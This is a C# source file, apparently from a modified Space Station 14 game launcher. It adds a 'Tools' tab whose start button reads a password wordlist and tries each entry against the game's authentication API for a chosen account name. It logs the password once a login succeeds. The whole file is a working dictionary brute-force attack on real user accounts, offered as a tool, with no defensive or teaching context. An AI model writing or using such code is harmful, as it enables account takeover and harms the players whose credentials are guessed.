using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Input;
using Avalonia.Controls;
using Avalonia.Data.Converters;
using Avalonia.Input;
using Avalonia.Media;
using DynamicData;
using Marsey;
using Marsey.Config;
using Marsey.Game.Patches;
using Marsey.Misc;
using Marsey.Stealthsey;
using Microsoft.Toolkit.Mvvm.Input;
using Serilog;
using Splat;
using SS14.Launcher.Api;
using SS14.Launcher.Marseyverse;
using SS14.Launcher.Models.ContentManagement;
using SS14.Launcher.Models.Data;
using SS14.Launcher.Models.EngineManager;
using SS14.Launcher.Models.Logins;
using SS14.Launcher.Utility;
using SS14.Launcher.ViewModels.Login;
using static SS14.Launcher.ViewModels.Login.LoginViewModel;


namespace SS14.Launcher.ViewModels.MainWindowTabs;

public class ToolsTabViewModel : MainWindowTabViewModel
{
    private readonly AuthApi _authApi;
    private readonly LoginManager _loginMgr;
    private readonly DataManager _dataManager;
    private LoginViewModel _login;

    public string CKey { get; set; } = "";
    public string Path { get; set; } = "";

    public override string Name => "Tools";

    public async void OnStartButtonPressed()
    {
        try
        {
            StreamReader sr = new StreamReader(Path);
            string dict = sr.ReadLine();

            while (dict != null)
            {
                dict = sr.ReadLine();
                var request = new AuthApi.AuthenticateRequest(CKey, dict);
                var resp = await _authApi.AuthenticateAsync(request);
                if (resp.IsSuccess)
                {
                    Log.Information($"SUCCESS!!! PASSWORD: {dict}");
                    break;
                }
            }
            sr.Close();
        }
        catch (Exception e)
        {
            Log.Error(e, "Something went wrong");
        }
    }
}
